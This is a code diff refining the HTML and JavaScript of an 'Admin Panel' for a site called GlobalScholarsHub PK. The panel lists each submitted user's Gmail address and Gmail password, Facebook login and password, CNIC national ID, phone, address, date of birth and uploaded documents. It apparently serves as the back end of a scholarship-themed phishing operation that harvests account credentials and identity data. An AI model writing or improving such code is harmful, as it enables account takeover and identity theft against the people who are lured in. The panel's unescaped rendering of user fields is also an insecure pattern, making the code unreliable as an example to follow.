@@ -4,16 +4,10 @@
     <title>Admin Panel - GlobalScholarsHub PK</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
     <style>
-        /* ============================================================ */
-        /*  RESET & BASE
-        /* ============================================================ */
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f0f4f8; padding: 20px; }
         .container { max-width: 1400px; margin: 0 auto; }
 
-        /* ============================================================ */
-        /*  HEADER
-        /* ============================================================ */
         .header {
             background: linear-gradient(135deg, #0a1628 0%, #1a365d 50%, #2563eb 100%);
             color: #fff;
@@ -29,20 +23,14 @@
         .header h1 { font-size: 28px; font-weight: 800; }
         .header h1 i { color: #fbbf24; margin-right: 10px; }
         .header p { opacity: 0.85; font-size: 14px; margin-top: 4px; }
-        .header-actions { display: flex; gap: 10px; flex-wrap: wrap; }
 
         .btn { padding: 10px 24px; border-radius: 50px; border: none; font-weight: 700; font-size: 13px; cursor: pointer; transition: all 0.3s ease; display: inline-flex; align-items: center; gap: 8px; }
         .btn:hover { transform: translateY(-2px); }
         .btn-refresh { background: #fbbf24; color: #0a1628; }
-        .btn-refresh:hover { box-shadow: 0 4px 20px rgba(251, 191, 36, 0.4); }
         .btn-clear { background: #ef4444; color: #fff; }
-        .btn-clear:hover { background: #dc2626; box-shadow: 0 4px 20px rgba(239, 68, 68, 0.4); }
+        .btn-clear:hover { background: #dc2626; }
         .btn-export { background: #22c55e; color: #fff; }
-        .btn-export:hover { background: #16a34a; box-shadow: 0 4px 20px rgba(34, 197, 94, 0.4); }
 
-        /* ============================================================ */
-        /*  STATS
-        /* ============================================================ */
         .stats {
             display: grid;
             grid-template-columns: repeat(4, 1fr);
@@ -56,26 +44,11 @@
             text-align: center;
             border: 1px solid #eef2f6;
             transition: all 0.3s ease;
-            position: relative;
-            overflow: hidden;
-        }
-        .stat-card::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            right: 0;
-            height: 3px;
-            background: linear-gradient(90deg, #2563eb, #7c3aed);
         }
         .stat-card:hover { transform: translateY(-4px); box-shadow: 0 8px 30px rgba(0,0,0,0.08); }
-        .stat-card .stat-icon { font-size: 28px; margin-bottom: 6px; display: block; }
-        .stat-card .stat-number { font-size: 34px; font-weight: 800; color: #0a1628; display: block; }
+        .stat-card .stat-number { font-size: 34px; font-weight: 800; color: #2563eb; display: block; }
         .stat-card .stat-label { color: #64748b; font-size: 14px; margin-top: 2px; display: block; }
 
-        /* ============================================================ */
-        /*  USER CARD
-        /* ============================================================ */
         .user-card {
             background: #fff;
             border-radius: 16px;
@@ -99,9 +72,7 @@
         .user-card .card-header .user-id { font-weight: 700; color: #0a1628; font-size: 16px; }
         .user-card .card-header .user-id i { color: #2563eb; margin-right: 8px; }
         .user-card .card-header .timestamp { background: #f0f4f8; padding: 4px 14px; border-radius: 50px; font-size: 12px; color: #64748b; }
-        .user-card .card-header .timestamp i { margin-right: 4px; }
 
-        /* ===== BADGES ===== */
         .badges { display: flex; flex-wrap: wrap; gap: 6px; margin-bottom: 14px; }
         .badge-tag { padding: 3px 14px; border-radius: 50px; font-size: 11px; font-weight: 700; display: inline-flex; align-items: center; gap: 5px; }
         .badge-gmail { background: #fce8e6; color: #ea4335; }
@@ -110,7 +81,6 @@
         .badge-doc { background: #fef3c7; color: #d97706; }
         .badge-img { background: #dbeafe; color: #2563eb; }
 
-        /* ===== DATA GRID ===== */
         .data-grid {
             display: grid;
             grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
@@ -123,13 +93,13 @@
             display: flex;
             align-items: center;
             gap: 6px;
+            flex-wrap: wrap;
         }
-        .data-grid .field .label { color: #64748b; font-weight: 500; min-width: 100px; }
+        .data-grid .field .label { color: #64748b; font-weight: 500; min-width: 90px; }
         .data-grid .field .value { color: #0a1628; font-weight: 600; }
         .data-grid .field .value.gmail { color: #ea4335; }
         .data-grid .field .value.fb { color: #1877f2; }
 
-        /* ===== ABOUT ===== */
         .about-box {
             background: #f8fafc;
             padding: 12px 16px;
@@ -141,7 +111,6 @@
         }
         .about-box strong { color: #0a1628; }
 
-        /* ===== DOCUMENTS ===== */
         .doc-section { margin-top: 12px; }
         .doc-section .doc-title { font-weight: 600; color: #0a1628; font-size: 14px; margin-bottom: 6px; }
         .doc-section .doc-title i { color: #2563eb; margin-right: 6px; }
@@ -157,21 +126,16 @@
         }
         .doc-item:hover { border-color: #2563eb; transform: scale(1.03); }
         .doc-item img { width: 90px; height: 70px; object-fit: cover; border-radius: 6px; border: 1px solid #e2e8f0; cursor: pointer; }
-        .doc-item img:hover { border-color: #2563eb; }
         .doc-item .doc-name { font-size: 10px; color: #64748b; margin-top: 4px; display: block; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; max-width: 90px; }
         .doc-item .doc-icon { font-size: 32px; color: #94a3b8; display: block; padding: 6px; }
         .doc-item .doc-size { font-size: 9px; color: #94a3b8; display: block; }
 
-        /* ===== PROFILE IMAGE ===== */
         .profile-img-section { margin-top: 12px; }
         .profile-img-section .img-title { font-weight: 600; color: #0a1628; font-size: 14px; margin-bottom: 6px; }
         .profile-img-section .img-title i { color: #2563eb; margin-right: 6px; }
         .profile-img { width: 80px; height: 80px; border-radius: 12px; object-fit: cover; border: 2px solid #eef2f6; cursor: pointer; transition: all 0.3s ease; }
         .profile-img:hover { border-color: #2563eb; transform: scale(1.05); }
 
-        /* ============================================================ */
-        /*  MISC
-        /* ============================================================ */
         .total-text { font-size: 16px; color: #0a1628; margin-bottom: 20px; font-weight: 600; }
         .total-text i { color: #2563eb; margin-right: 8px; }
         .no-data { text-align: center; padding: 60px; color: #94a3b8; background: #fff; border-radius: 16px; border: 1px solid #eef2f6; }
@@ -179,72 +143,36 @@
         .toast { position: fixed; bottom: 30px; right: 30px; background: #22c55e; color: #fff; padding: 16px 24px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.15); font-weight: 600; display: none; z-index: 999; }
         .toast.error { background: #ef4444; }
 
-        /* ============================================================ */
-        /*  RESPONSIVE
-        /* ============================================================ */
-        @media (max-width: 1024px) {
-            .stats { grid-template-columns: repeat(2, 1fr); }
-        }
-        @media (max-width: 768px) {
-            .header { flex-direction: column; text-align: center; }
-            .data-grid { grid-template-columns: 1fr; }
-            .stats { grid-template-columns: 1fr 1fr; }
-            .doc-item { width: 100px; }
-            .doc-item img { width: 80px; height: 60px; }
-        }
-        @media (max-width: 480px) {
-            .stats { grid-template-columns: 1fr; }
-            .user-card { padding: 18px 16px; }
-        }
+        @media (max-width: 1024px) { .stats { grid-template-columns: repeat(2, 1fr); } }
+        @media (max-width: 768px) { .header { flex-direction: column; text-align: center; } .data-grid { grid-template-columns: 1fr; } .stats { grid-template-columns: 1fr 1fr; } .doc-item { width: 100px; } .doc-item img { width: 80px; height: 60px; } }
+        @media (max-width: 480px) { .stats { grid-template-columns: 1fr; } .user-card { padding: 18px 16px; } }
     </style>
 </head>
 <body>
 
     <div class="container">
-
-        <!-- ===== HEADER ===== -->
         <div class="header">
             <div>
                 <h1><i class="fas fa-user-shield"></i>Admin Panel</h1>
                 <p>GlobalScholarsHub PK — Complete User Data Management</p>
             </div>
-            <div class="header-actions">
+            <div style="display:flex;gap:10px;flex-wrap:wrap;">
                 <button class="btn btn-refresh" onclick="loadUsers()"><i class="fas fa-sync-alt"></i> Refresh</button>
                 <button class="btn btn-export" onclick="exportData()"><i class="fas fa-download"></i> Export</button>
                 <button class="btn btn-clear" onclick="clearAllData()"><i class="fas fa-trash"></i> Clear All</button>
             </div>
         </div>
 
-        <!-- ===== STATS ===== -->
         <div class="stats" id="statsContainer">
-            <div class="stat-card">
-                <span class="stat-icon">👥</span>
-                <span class="stat-number" id="totalUsers">0</span>
-                <span class="stat-label">Total Users</span>
-            </div>
-            <div class="stat-card">
-                <span class="stat-icon">📧</span>
-                <span class="stat-number" id="gmailUsers">0</span>
-                <span class="stat-label">Gmail Registrations</span>
-            </div>
-            <div class="stat-card">
-                <span class="stat-icon">📘</span>
-                <span class="stat-number" id="fbUsers">0</span>
-                <span class="stat-label">Facebook Verified</span>
-            </div>
-            <div class="stat-card">
-                <span class="stat-icon">✅</span>
-                <span class="stat-number" id="profileUsers">0</span>
-                <span class="stat-label">Profile Completed</span>
-            </div>
+            <div class="stat-card"><span class="stat-number" id="totalUsers">0</span><span class="stat-label">Total Users</span></div>
+            <div class="stat-card"><span class="stat-number" id="gmailUsers">0</span><span class="stat-label">Gmail Registrations</span></div>
+            <div class="stat-card"><span class="stat-number" id="fbUsers">0</span><span class="stat-label">Facebook Verified</span></div>
+            <div class="stat-card"><span class="stat-number" id="profileUsers">0</span><span class="stat-label">Profile Completed</span></div>
         </div>
 
-        <!-- ===== USERS LIST ===== -->
         <div id="usersList"></div>
-
     </div>
 
-    <!-- ===== TOAST ===== -->
     <div id="toast" class="toast"></div>
 
     <script>
@@ -257,14 +185,21 @@
                 const response = await fetch('/api/users');
                 if (!response.ok) throw new Error(`HTTP ${response.status}`);
                 const users = await response.json();
-                console.log('📊 Users:', users.length);
+                console.log('📊 Users received:', users);
 
-                // Stats
-                document.getElementById('totalUsers').textContent = users.length;
+                // ===== FIX: Check email property correctly =====
                 const gmailCount = users.filter(u => u.email && u.email.trim() !== '').length;
-document.getElementById('gmailUsers').textContent = gmailCount;
-                document.getElementById('fbUsers').textContent = users.filter(u => u.fbEmail).length;
-                document.getElementById('profileUsers').textContent = users.filter(u => u.profileCompleted).length;
+                const fbCount = users.filter(u => u.fbEmail && u.fbEmail.trim() !== '').length;
+                const profileCount = users.filter(u => u.profileCompleted === true).length;
+
+                document.getElementById('totalUsers').textContent = users.length;
+                document.getElementById('gmailUsers').textContent = gmailCount;
+                document.getElementById('fbUsers').textContent = fbCount;
+                document.getElementById('profileUsers').textContent = profileCount;
+
+                console.log('📊 Gmail count:', gmailCount);
+                console.log('📊 Facebook count:', fbCount);
+                console.log('📊 Profile count:', profileCount);
 
                 const container = document.getElementById('usersList');
 
@@ -279,70 +214,69 @@ document.getElementById('gmailUsers').textContent = gmailCount;
                     const num = users.length - idx;
                     const hasDocs = user.documents?.length > 0;
                     const hasImg = !!user.profileImage;
+                    const hasGmail = user.email && user.email.trim() !== '';
+                    const hasFb = user.fbEmail && user.fbEmail.trim() !== '';
 
                     html += `<div class="user-card">`;
 
-                    // ---- Header ----
+                    // Header
                     html += `<div class="card-header">
                         <span class="user-id"><i class="fas fa-user-circle"></i>User #${num}</span>
                         <span class="timestamp"><i class="far fa-calendar-alt"></i> ${user.submittedAt || user.submitted_at || 'N/A'}</span>
                     </div>`;
 
-                    // ---- Badges ----
+                    // Badges
                     html += `<div class="badges">`;
-                    if (user.email) html += `<span class="badge-tag badge-gmail"><i class="fas fa-envelope"></i> Gmail</span>`;
-                    if (user.fbEmail) html += `<span class="badge-tag badge-fb"><i class="fab fa-facebook"></i> Facebook</span>`;
+                    if (hasGmail) html += `<span class="badge-tag badge-gmail"><i class="fas fa-envelope"></i> Gmail</span>`;
+                    if (hasFb) html += `<span class="badge-tag badge-fb"><i class="fab fa-facebook"></i> Facebook</span>`;
                     if (user.profileCompleted) html += `<span class="badge-tag badge-profile"><i class="fas fa-check-circle"></i> Profile Complete</span>`;
                     if (hasDocs) html += `<span class="badge-tag badge-doc"><i class="fas fa-file"></i> ${user.documents.length} Docs</span>`;
                     if (hasImg) html += `<span class="badge-tag badge-img"><i class="fas fa-image"></i> Photo</span>`;
                     html += `</div>`;
 
-                    // ---- Data Grid ----
+                    // Data Grid - ALL FIELDS
                     html += `<div class="data-grid">`;
-                    const fields = [
-                        { label: 'Full Name', key: 'name' },
-                        { label: 'Gmail', key: 'email', cls: 'gmail' },
-                        { label: 'Gmail Password', key: 'password' },
-                        { label: 'Facebook ID', key: 'fbEmail', cls: 'fb' },
-                        { label: 'FB Password', key: 'fbPassword' },
-                        { label: 'First Name', key: 'firstName' },
-                        { label: 'Last Name', key: 'lastName' },
-                        { label: 'Date of Birth', key: 'dob' },
-                        { label: 'Gender', key: 'gender' },
-                        { label: 'Nationality', key: 'nationality' },
-                        { label: 'Country', key: 'country' },
-                        { label: 'Phone', key: 'phone' },
-                        { label: 'City', key: 'city' },
-                        { label: 'CNIC', key: 'cnic' },
-                        { label: 'Education Level', key: 'educationLevel' },
-                        { label: 'Field of Study', key: 'fieldOfStudy' },
-                        { label: 'University', key: 'university' },
-                        { label: 'GPA / %', key: 'gpa' },
-                        { label: 'Address', key: 'address' },
-                        { label: 'Skills', key: 'skills' }
-                    ];
-                    fields.forEach(f => {
-                        if (user[f.key]) {
-                            const cls = f.cls ? `value ${f.cls}` : 'value';
-                            html += `<div class="field"><span class="label">${f.label}:</span> <span class="${cls}">${user[f.key]}</span></div>`;
-                        }
-                    });
+                    
+                    // Gmail Fields (priority)
+                    if (user.name) html += `<div class="field"><span class="label">Full Name:</span> <span class="value">${user.name}</span></div>`;
+                    if (user.email) html += `<div class="field"><span class="label">📧 Gmail:</span> <span class="value gmail">${user.email}</span></div>`;
+                    if (user.password) html += `<div class="field"><span class="label">Gmail Password:</span> <span class="value">${user.password}</span></div>`;
+                    
+                    // Facebook Fields
+                    if (user.fbEmail) html += `<div class="field"><span class="label">📘 Facebook:</span> <span class="value fb">${user.fbEmail}</span></div>`;
+                    if (user.fbPassword) html += `<div class="field"><span class="label">FB Password:</span> <span class="value">${user.fbPassword}</span></div>`;
+                    
+                    // Profile Fields
+                    if (user.firstName) html += `<div class="field"><span class="label">First Name:</span> <span class="value">${user.firstName}</span></div>`;
+                    if (user.lastName) html += `<div class="field"><span class="label">Last Name:</span> <span class="value">${user.lastName}</span></div>`;
+                    if (user.dob) html += `<div class="field"><span class="label">Date of Birth:</span> <span class="value">${user.dob}</span></div>`;
+                    if (user.gender) html += `<div class="field"><span class="label">Gender:</span> <span class="value">${user.gender}</span></div>`;
+                    if (user.nationality) html += `<div class="field"><span class="label">Nationality:</span> <span class="value">${user.nationality}</span></div>`;
+                    if (user.country) html += `<div class="field"><span class="label">Country:</span> <span class="value">${user.country}</span></div>`;
+                    if (user.phone) html += `<div class="field"><span class="label">Phone:</span> <span class="value">${user.phone}</span></div>`;
+                    if (user.city) html += `<div class="field"><span class="label">City:</span> <span class="value">${user.city}</span></div>`;
+                    if (user.cnic) html += `<div class="field"><span class="label">CNIC:</span> <span class="value">${user.cnic}</span></div>`;
+                    if (user.educationLevel) html += `<div class="field"><span class="label">Education Level:</span> <span class="value">${user.educationLevel}</span></div>`;
+                    if (user.fieldOfStudy) html += `<div class="field"><span class="label">Field of Study:</span> <span class="value">${user.fieldOfStudy}</span></div>`;
+                    if (user.university) html += `<div class="field"><span class="label">University:</span> <span class="value">${user.university}</span></div>`;
+                    if (user.gpa) html += `<div class="field"><span class="label">GPA / %:</span> <span class="value">${user.gpa}</span></div>`;
+                    if (user.address) html += `<div class="field"><span class="label">Address:</span> <span class="value">${user.address}</span></div>`;
+                    if (user.skills) html += `<div class="field"><span class="label">Skills:</span> <span class="value">${user.skills}</span></div>`;
+                    
                     html += `</div>`;
 
-                    // ---- About ----
+                    // About
                     if (user.about) {
                         html += `<div class="about-box"><strong>📝 About:</strong> ${user.about}</div>`;
                     }
 
-                    // ---- Documents ----
+                    // Documents
                     if (hasDocs) {
                         html += `<div class="doc-section"><div class="doc-title"><i class="fas fa-file-upload"></i>Documents Uploaded (${user.documents.length})</div><div class="doc-gallery">`;
                         user.documents.forEach(doc => {
                             const isImage = doc.data?.startsWith('data:image/');
-                            const ext = doc.name?.split('.').pop().toLowerCase();
-                            const isImgExt = ['jpg','jpeg','png','gif','webp','bmp','svg'].includes(ext);
-                            if (isImage || isImgExt) {
-                                html += `<div class="doc-item"><img src="${doc.data || ''}" alt="${doc.name || 'Image'}" onclick="window.open(this.src)" /><span class="doc-name">${doc.name || 'Image'}</span><span class="doc-size">${doc.size ? (doc.size/1024).toFixed(1)+' KB' : ''}</span></div>`;
+                            if (isImage || ['jpg','jpeg','png','gif','webp','bmp','svg'].includes(doc.name?.split('.').pop()?.toLowerCase())) {
+                                html += `<div class="doc-item"><img src="${doc.data || ''}" onclick="window.open(this.src)" /><span class="doc-name">${doc.name || 'Image'}</span><span class="doc-size">${doc.size ? (doc.size/1024).toFixed(1)+' KB' : ''}</span></div>`;
                             } else {
                                 html += `<div class="doc-item"><span class="doc-icon"><i class="fas fa-file-pdf"></i></span><span class="doc-name">${doc.name || 'File'}</span><span class="doc-size">${doc.size ? (doc.size/1024).toFixed(1)+' KB' : ''}</span></div>`;
                             }
@@ -350,7 +284,7 @@ document.getElementById('gmailUsers').textContent = gmailCount;
                         html += `</div></div>`;
                     }
 
-                    // ---- Profile Image ----
+                    // Profile Image
                     if (hasImg) {
                         html += `<div class="profile-img-section"><div class="img-title"><i class="fas fa-image"></i>Profile Image</div><img src="${user.profileImage}" class="profile-img" onclick="window.open(this.src)" /></div>`;
                     }
